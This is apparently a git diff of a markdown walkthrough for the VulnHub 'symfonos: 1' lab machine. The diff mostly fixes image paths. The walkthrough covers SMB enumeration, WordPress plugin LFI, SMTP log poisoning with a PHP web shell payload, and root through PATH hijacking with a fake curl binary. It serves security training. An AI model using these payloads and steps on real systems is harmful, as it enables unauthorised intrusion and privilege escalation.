@@ -1,7 +1,8 @@
 <h1>symfonos: 1</h1>
 
-**Today, we'll be looking at the symfonos 1 machine on vulnhub.
-You can download the machine here:**
+**Today, we'll be looking at the symfonos 1 machine on vulnhub.**
+
+**You can download the machine here:**
 <https://www.vulnhub.com/entry/symfonos-1,322/>
 
 Let's scan the machine with nmap.
@@ -65,68 +66,78 @@ Nmap done: 1 IP address (1 host up) scanned in 45.81 seconds
 ```
 
 We can see that the machine is running smb.
+
 Let's use enum4linux to enumerate the mahcine.
 
 ```enum4linux -a 172.16.243.134```
 
 We found a username.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic1.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic1.png)
 
 We also found shares on the machine.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic2.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic2.png)
 
 Let's check the anonymous share as it doesn't have a password.
 
 ```smbclient //symfonos.local//anonymous```
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic3.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic3.png)
 
 We found an interesting file **attention.txt**.
+
 Let's get that.
 
 Looks like we got some passwords.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic4.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic4.png)
 
 Let's try to login into the helios share with those.
+
 We got in with the password **qwerty**.
+
 We also found two files.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic5.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic5.png)
 
 We found a directory in the **todo.txt** file.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic6.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic6.png)
 
 Looks like it's runnin wordpress.
 
 Let's run wpscan.
+
 ```wpscan --url http://symfonos.local/h3l105```
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic7.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic7.png)
 
 We found a plugin called **mail-masta** that has an LFI vulnerability.
+
 You can find it [here](https://www.exploit-db.com/exploits/40290).
 
 We can read the /etc/passwd file.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic8.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic8.png)
 
 Now, let's try to include php shell code.
+
 We can use the smtp server running on port 25 to send the php code.
 
 ```MAIL FROM: <hacker>```
+
 ```RCPT TO: Helios```
+
 ```data```
+
 ```<?php system($_GET[‘cmd’]); ?>```
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic9.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic9.png)
 
 We can verify it's working by runnin the command **id**.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic10.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic10.png)
 
 Now, let's open a shell on the machine.
 
@@ -136,25 +147,30 @@ I'll use this python shell.
 
 We got a shell.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic11.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic11.png)
 
 
 After some local enumeration, I found an interesting file in the **opt** directory called **statuscheck**.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic12.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic12.png)
 
 I ran it and looks like it ran the curl command.
+
 And it is run as root.
+
 We can modify the PATH variable and use that to gain root priviliges.
 
 First let's go to the **tmp** directory and create our own curl command.
+
 After that, we need to modify the PATH variable to run the curl command we just created.
 
 ``echo "/bin/sh" > curl``
+
 ``chmod 777 curl``
+
 ``export PATH=.:$PATH``
 
 Now, if we run ``/opt/statuscheck``, we should become root.
 
-![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/pwnlab/pics/pic13.png)
+![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic13.png)
 
